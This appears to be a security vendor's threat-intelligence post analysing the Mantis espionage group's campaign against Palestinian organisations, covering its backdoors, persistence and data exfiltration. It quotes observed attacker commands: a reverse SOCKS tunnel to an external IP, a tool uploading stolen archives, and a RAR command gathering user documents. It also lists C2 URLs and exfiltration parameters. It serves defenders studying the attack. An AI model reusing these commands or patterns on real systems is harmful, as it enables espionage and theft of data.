id="page-title" class="blog-post__title">Mantis: New Tooling Used in Attacks Against Palestinian Targets</h1><h2 class="blog-post__subtitle">Espionage group puts time and effort into avoiding detection and maintaining persistent presence on compromised networks.</h2></header><span><!----><app-paragraph-rte _nghost-ng-c2666164074><div _ngcontent-ng-c2666164074><p>The Mantis cyber-espionage group (aka Arid Viper, Desert Falcon, APT-C-23), a threat actor believed to be operating out of the Palestinian territories<strong><u>,</u></strong> is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks.</p>

<p>While the group is known for targeting organizations in the Middle East, the most recent campaign uncovered by Symantec, by <a href="https://web.archive.org/web/20231227054130/https://software.broadcom.com/">Broadcom Software</a>, focused on organizations within the Palestinian territories, with malicious activity beginning in September 2022 and continuing to at least February 2023. This targeting is not unprecedented for Mantis and Symantec previously uncovered attacks against individuals located in the Palestinian territories during 2017.</p>

<h2>Background</h2>

<p>Mantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. The group is known to target organizations in Israel and a number of other Middle Eastern countries. Sectors targeted include government, military, financial, media, education, energy, and think tanks. The group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices.</p>

<p>Mantis is widely accepted to be linked to the Palestinian territories. While <a href="https://web.archive.org/web/20231227054130/https://www.cybereason.com/blog/operation-bearded-barbie-apt-c-23-campaign-targeting-israeli-officials">other vendors have linked the group to Hamas</a>, Symantec cannot make a definitive attribution to any Palestinian organization.</p>

<p>In its most recent attacks, the group used updated versions of its custom Micropsia and Arid Gopher backdoors to compromise targets before engaging in extensive credential theft and exfiltration of stolen data.</p>

<h2>Attack chain</h2>

<p>The initial infection vector for this campaign remains unknown. In one organization targeted, a feature of the compromise was that the attackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network.</p>

<p>The following is a description of how one of those three toolsets was used:</p>

<p>The first evidence of malicious activity occurred on December 18, 2022. Three distinct sets of obfuscated PowerShell commands were executed to load a Base64-encoded string, which started embedded shellcode.&nbsp;The shellcode was a 32-bit stager that downloaded another stage using basic TCP-based protocol from a command-and-control (C&amp;C) server: 104.194.222[.]50 port 4444.</p>

<p>The attackers returned on December 19 to dump credentials before downloading the Micropsia backdoor and Putty, <a href="https://web.archive.org/web/20231227054130/https://www.putty.org/">a publicly available SSH client</a>, using Certutil and BITSAdmin</p>

<p>Micropsia subsequently executed and initiated contact with a C&amp;C server. On the same day, Micropsia also executed on three other machines in the same organization. In each case, it ran in a folder named after its file name:</p>

<ul>
	<li>csidl_common_appdata\systempropertiesinternationaltime\systempropertiesinternationaltime.exe</li>
	<li>csidl_common_appdata\windowsnetworkmanager\windowsnetworkmanager.exe</li>
	<li>csidl_common_appdata\windowsps\windowsps.exe</li>
</ul>

<p>On one computer, Micropsia was used to set up a reverse socks tunnel to an external IP address:</p>

<p class="Code">CSIDL_COMMON_APPDATA\windowsservicemanageav\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [REDACTED]</p>

<p>On December 20, Micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers.</p>

<p>The following day, December 21, RAR was executed to archive files on another infected computer.</p>

<p>Between December 22 and January 2, 2023, Micropsia was used to execute the Arid Gopher backdoor on three infected computers. Arid Gopher was in turn used to run a tool called SetRegRunKey.exe that provided persistence by adding Arid Gopher to the registry so that it executed on reboot. It also ran an unknown file named localsecuritypolicy.exe (this file name was used for the Arid Gopher backdoor elsewhere by the attackers).</p>

<p>On December 28, Micropsia was used to run windowspackages.exe on three more infected computers.</p>

<p>On December 31, Arid Gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two of the infected computers.</p>

<p>On January 2, the attackers retired the version of Arid Gopher they were using and introduced a new variant. Whether this was because the first version was discovered or whether it was standard operating procedure is unclear.</p>

<p>On January 4, Micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder: csidl_common_appdata\hostupbroker\hostupbroker.exe. This was immediately followed by the exfiltration of a RAR file:</p>

<p class="Code">CSIDL_COMMON_APPDATA\windowsupserv\windowsupserv.exe -f CSIDL_COMMON_APPDATA\windowspackages\01-04-2023-15-13-39_getf.rar</p>

<p>On January 9, Arid Gopher was used to execute two unknown files on a single computer:</p>

<ul>
	<li>csidl_common_appdata\teamviewrremoteservice\teamviewrremoteservice.exe</li>
</ul>

<ul>
	<li>csidl_common_appdata\embededmodeservice\embededmodeservice.exe</li>
</ul>

<p>The last malicious activity occurred from January 12 onwards when Arid Gopher was used to execute the unknown file named localsecuritypolicy.exe every ten hours.</p>

<h2>Micropsia</h2>

<p>Variants of the Micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. In this campaign, Micropsia was deployed using multiple file names and file paths:</p>

<ul>
	<li>csidl_common_appdata\microsoft\dotnet35\microsoftdotnet35.exe</li>
	<li>csidl_common_appdata\microsoftservicesusermanual\systempropertiesinternationaltime.exe</li>
	<li>csidl_common_appdata\systempropertiesinternationaltime\systempropertiesinternationaltime.exe</li>
	<li>csidl_common_appdata\windowsnetworkmanager\windowsnetworkmanager.exe</li>
	<li>csidl_common_appdata\windowsps\windowsps.exe</li>
</ul>

<p>Micropsia is executed using WMI and its main purpose appears to be running secondary payloads for the attackers. These included:</p>

<ul>
	<li>Arid Gopher (file names: networkvirtualizationstartservice.exe, networkvirtualizationfiaservice.exe, networkvirtualizationseoservice.exe)</li>
	<li><a href="https://web.archive.org/web/20231227054130/https://github.com/kost/revsocks">Reverse SOCKs Tunneler</a> (aka Revsocks) (file name: windowsservicemanageav.exe)</li>
	<li>Data Exfiltration Tool (file name: windowsupserv.exe)</li>
	<li>Two unknown files, both named hostupbroker.exe</li>
	<li>Unknown file named windowspackages.exe</li>
</ul>

<p>In addition to this, Micropsia has its own functionality, such as taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration:</p>

<p class="Code"><em>"%PROGRAMDATA%\Software Distributions\WinRAR\Rar.exe" a -r -ep1 -v2500k -hp71012f4c6bdeeb73ae2e2196aa00bf59_d01247a1eaf1c24ffbc851e883e67f9b -ta2023-01-14 "%PROGRAMDATA%\Software Distributions\Bdl\LMth__C_2023-02-13 17-14-41" "%USERPROFILE%\*.xls" "%USERPROFILE%\*.xlsx" "%USERPROFILE%\*.doc" "%USERPROFILE%\*.docx" "%USERPROFILE%\*.csv" "%USERPROFILE%\*.pdf" "%USERPROFILE%\*.ppt" "%USERPROFILE%\*.pptx" "%USERPROFILE%\*.odt" "%USERPROFILE%\*.mdb" "%USERPROFILE%\*.accdb" "%USERPROFILE%\*.accde" "%USERPROFILE%\*.txt" "%USERPROFILE%\*.rtf" "%USERPROFILE%\*.vcf"</em></p>

<h2>Arid Gopher</h2>

<p>Unlike Micropsia, which is written in Delphi, Arid Gopher is written in Go. Versions of Arid Gopher used in this campaign contain the following embedded components:</p>

<ul>
	<li>7za.exe – A copy of the legitimate 7-Zip executable</li>
	<li>AttestationWmiProvider.exe – A tool that sets a “run” registry value</li>
	<li>ServiceHubIdentityHost.exe – A copy of legitimate Shortcut.exe executable from Optimum X</li>
	<li>Setup.env – Configuration file</li>
</ul>

<p>Arid Gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and networkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with PyArmor.</p>

<p>When communicating with a C&amp;C server, Arid Gopher registers a device on one path then connects to another path, likely to receive commands:</p>

<ul>
	<li>Connects to: http://jumpstartmail[.]com/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 79.133.51[.]134) - likely to register device</li>
	<li>Followed by: http://jumpstartmail[.]com/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC - likely to receive commands</li>
	<li>Connects to: http://salimafia[.]net/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 146.19.233[.]32) - likely to register device</li>
	Followed by: http://salimafia[.]net/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC - likely to receive commands
</ul>

<p>Arid Gopher appears to be regularly updated and rewritten by the attackers, most likely in order to evade detection. One variant of the malware was radically different from previous versions seen with most of the distinctive code updated, so much so that there was not a single subroutine that contained identical distinctive code when compared with the previous version. Mantis appeared to be aggressively mutating the logic between variants, which is a time-intensive operation if done manually.</p>

<h2>Exfiltration Tool</h2>

<p>The attackers also used a custom tool to exfiltrate data stolen from targeted organizations: a 64-bit PyInstaller executable named WindowsUpServ.exe. When run, the tool checks for the following command-line arguments:&nbsp;</p>

<p class="Code"><em>"-d" "[FILE_DIRECTORY]"</em></p>

<p class="Code"><em>"-f" "[FILENAME]"</em></p>

<p>For each "-f" "[FILENAME]" command-line argument, the tool uploads the content of&nbsp;[FILENAME]. For each "-d" "[FILE_DIRECTORY]" command-line argument, the tool obtains a list of files stored in the folder&nbsp;[FILE_DIRECTORY]&nbsp;and uploads the content of each file.</p>

<p>When uploading each file, the tools sends an HTTP POST request to a C&amp;C server with the following parameters:</p>

<p class="Code"><em>"kjdfnqweb":&nbsp;[THE_FILE_CONTENT]</em></p>

<p class="Code"><em>"qyiwekq":&nbsp;[HOSTNAME_OF_THE_AFFECTED_COMPUTER]</em></p>

<p>Whenever the remote server responds with the status code 200, the malware deletes the uploaded file from the local disk. The malware may also log some of its actions in the following files:</p>

<p class="Code"><em>"C:\ProgramData\WindowsUpServ\success.txt"</em></p>

<p class="Code"><em>"C:\ProgramData\WindowsUpServ\err.txt"</em></p>

<h2>Determined Adversary</h2>

<p>Mantis appears to be a determined adversary, willing to put time and effort into maximizing its chances of success, as evidenced by extensive malware rewriting and its decision to compartmentalize attacks against single organizations into multiple separate strands to reduce the chances of the entire operation being detected.</p>
